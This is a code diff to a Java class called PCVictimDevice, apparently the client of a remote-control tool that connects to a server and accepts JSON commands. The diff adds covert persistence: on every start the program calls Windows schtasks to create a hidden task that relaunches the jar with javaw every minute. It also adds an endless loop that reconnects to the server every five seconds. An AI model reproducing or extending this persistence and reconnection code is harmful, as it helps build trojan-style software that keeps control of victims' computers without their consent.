@@ -66,17 +66,10 @@ public class PCVictimDevice {
             });
 
             ChannelFuture f = bootstrap.connect(host, port).sync();
-            waitInputConsole();
+            //waitInputConsole();
             f.channel().closeFuture().sync();
         } catch (Exception e) {
-            try {
-                int mills = 5000;
-                System.out.println("Нет соединения с сервером! Ожидаем "+mills/1000+" сек....");
-                Thread.sleep(mills);
-            } catch (InterruptedException e1) {
-                e1.printStackTrace();
-            }
-            run();
+            e.printStackTrace();
         }
         finally {
             workerGroup.shutdownGracefully();
@@ -99,6 +92,28 @@ public class PCVictimDevice {
             } catch (Exception e) {
                 System.out.println("Запрос должен быть формата JSON!");
             }
+        }
+    }
+
+    public static void autorun(boolean isAutorun) {
+        // jar file
+        String path = new File(System.getProperty("java.class.path")).getAbsolutePath();
+        String s;
+        try
+        {
+            String[] params = path.split(";");
+            if(isAutorun) {
+                if (params.length > 1)
+                    s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar C:\\Users\\Vetal\\Desktop\\IntelIJProjects\\NettyProject\\out\\artifacts\\NettyProject_jar\\NettyProject.jar\" /ri 1 /f";
+                else
+                    s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar "+path+"\" /ri 1 /f";
+            }
+            else s = "schtasks /delete /tn TestJava";
+
+            System.out.println(s);
+            Runtime.getRuntime().exec(s);
+        } catch (Exception ex){
+            ex.printStackTrace();
         }
     }
 
@@ -193,7 +208,13 @@ public class PCVictimDevice {
     }
 
     public static void main(String[] args) throws Exception {
+        autorun(true);
         pcVictimDevice = new PCVictimDevice("localhost", 1121);
-        pcVictimDevice.run();
+        while (true) {
+            pcVictimDevice.run();
+
+            System.out.println("Ожидаем 5 секунд...");
+            Thread.sleep(5000);
+        }
     }
 }
